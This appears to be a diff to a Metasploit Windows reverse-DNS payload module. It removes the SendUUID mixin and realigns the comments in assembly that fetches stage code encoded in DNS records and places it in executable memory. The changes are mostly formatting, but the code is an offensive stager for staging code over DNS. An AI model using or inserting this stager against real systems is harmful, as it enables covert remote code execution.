@@ -2,7 +2,6 @@
 
 require 'msf/core'
 require 'msf/core/payload/transport_config'
-require 'msf/core/payload/windows/send_uuid'
 require 'msf/core/payload/windows/block_api'
 require 'msf/core/payload/windows/exitfunk'
 
@@ -18,7 +17,6 @@ module Payload::Windows::ReverseDns
 
   include Msf::Payload::TransportConfig
   include Msf::Payload::Windows
-  include Msf::Payload::Windows::SendUUID
   include Msf::Payload::Windows::BlockApi
   include Msf::Payload::Windows::Exitfunk
 
@@ -44,13 +42,6 @@ module Payload::Windows::ReverseDns
     generate_reverse_dns(conf)
   end
 
-  #
-  # By default, we don't want to send the UUID, but we'll send
-  # for certain payloads if requested.
-  #
-  def include_send_uuid
-    false
-  end
 
   def transport_config(opts={})
     transport_config_reverse_dns(opts)
@@ -106,7 +97,7 @@ module Payload::Windows::ReverseDns
     ns_server    = "0x%.8x" % Rex::Socket.addr_aton(opts[:ns_server]||"0.0.0.0").unpack("V").first
     domain_length= domain.length + 18
     
-    alloc_stack  = (domain_length) + (4 - (domain_length %4))
+    alloc_stack  = (domain_length) + (4 - (domain_length % 4))
     reliable     = opts[:reliable]
     
     asm = %Q^
@@ -166,7 +157,8 @@ module Payload::Windows::ReverseDns
          pop         ebp
          ret         8   
          ;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-
+         
+        ;;;;;;;;;;; CALL DNS
      call_dns:
          push        ebp
          mov         ebp, esp
@@ -177,10 +169,10 @@ module Payload::Windows::ReverseDns
       dns_loop:
          mov         eax, [esp + 4]
          test        eax, eax
-         je          dns_loop_end            ; out of tries 8(
+         je          dns_loop_end              ; out of tries 8(
          mov         eax, [esp]
          test        eax, eax
-         je          dns_loop_end            ; done, got result
+         je          dns_loop_end              ; done, got result
          push        0
          mov         eax, [ebp + 4]            ;  result
          push        eax
@@ -219,10 +211,10 @@ module Payload::Windows::ReverseDns
          push        eax                 ; pointer to RWX memory (for stage1)
          push        eax                 ; size of stage1
          push        eax                 ; offset
-         push        eax               ; * pointer to DNS_RECORD(as result)
+         push        eax                 ; * pointer to DNS_RECORD(as result)
          push        eax
-         push        eax               ; * IP4_ARRAY[1]
-         push        #{retry_count}        ; * tries counter
+         push        eax                 ; * IP4_ARRAY[1]
+         push        #{retry_count}      ; * tries counter
 
          ;;;;;;;;; main proc
 
@@ -243,7 +235,7 @@ module Payload::Windows::ReverseDns
          push        eax                 ; DOMAIN pointer
 
       get_header:
-         dec         [esp + 0x0c]      ; load tries number
+         dec         [esp + 0x0c]        ; load tries number
          mov         eax, [esp + 0x0c]   ; decrement
          test        eax, eax
          je          exit_func
@@ -260,18 +252,18 @@ module Payload::Windows::ReverseDns
          je          parse_end_b
          sub         eax, 18h
          push        eax
-         mov         esi, esp            ; pointer to DNS_RECORD
+         mov         esi, esp              ; pointer to DNS_RECORD
          mov         [esi], eax            ; ESI < -pointer to DNS_RECORD
          mov         ebx, [esi]            ; EBX < -current pointer
          mov         edx, [ebx]
          mov         [esi], edx            ; save Next IP
          mov         edx, ebx
-         add         edx, 0x18            ; EDX < -IP pointer
+         add         edx, 0x18             ; EDX < -IP pointer
          movzx       ecx, byte ptr[edx + 1]   ; header byte 1
-         cmp         cl, 0x81            ; If this is header flag
+         cmp         cl, 0x81                 ; If this is header flag
          jne         parse_end_b
          movzx       ecx, byte ptr[edx]
-         cmp         cl, 0xfe            ; check if fe have data flag in this header
+         cmp         cl, 0xfe                 ; check if fe have data flag in this header
          jne         parse_end_b
          
       get_size:
@@ -330,30 +322,30 @@ module Payload::Windows::ReverseDns
          add         eax, 18h
          je          parse_end_db
          sub         eax, 18h
-         push        eax               ; ESI <-pointer to DNS_RECORD
+         push        eax                  ; ESI <-pointer to DNS_RECORD
          mov         eax, [esp + 0x20]
-         push        eax                 ; save current offset
+         push        eax                  ; save current offset
       ip_enum:
          mov         eax, [esp+4]            
          test        eax, eax
          je          copy_end
-         mov         ebx, [eax]         ; EBX <-current pointer
+         mov         ebx, [eax]          ; EBX <-current pointer
          mov         [esp + 4], ebx      ; save Next IP
          mov         edx, eax
-         add         edx, 0x18         ; EDX <-IP pointer
+         add         edx, 0x18           ; EDX <-IP pointer
          xor         eax, eax
 
          movzx       ecx, byte ptr[edx + 1]      ; header byte 1, size for IP
          mov         al, cl
          and         cl, 0x0f                    ; apply MASK to get size of data in that IP
-         cmp         cl, 0x0e               ; amount of bytes in that IP, should be 14 or less
+         cmp         cl, 0x0e                    ; amount of bytes in that IP, should be 14 or less
          ja          parse_end_db
 
 
          movzx       ebx, byte ptr[edx]
-         cmp         bl, 0xfe               ; if FE, than index offset is 16
+         cmp         bl, 0xfe                    ; if FE, than index offset is 16
          je          index_16
-         cmp         bl, 0xff               ; if FF, than index offset in AL reg
+         cmp         bl, 0xff                    ; if FF, than index offset in AL reg
          je          index_al
          jmp         parse_end_db                ; else - something wrong!
       
@@ -367,7 +359,7 @@ module Payload::Windows::ReverseDns
          imul        eax, 0x0e
 
       copy_ip_as_data:
-         mov         esi, edx               ; src - IP addr
+         mov         esi, edx                ; src - IP addr
          add         esi, 2
          mov         ebx, [esp]
          mov         edi, [esp + 0x2c]
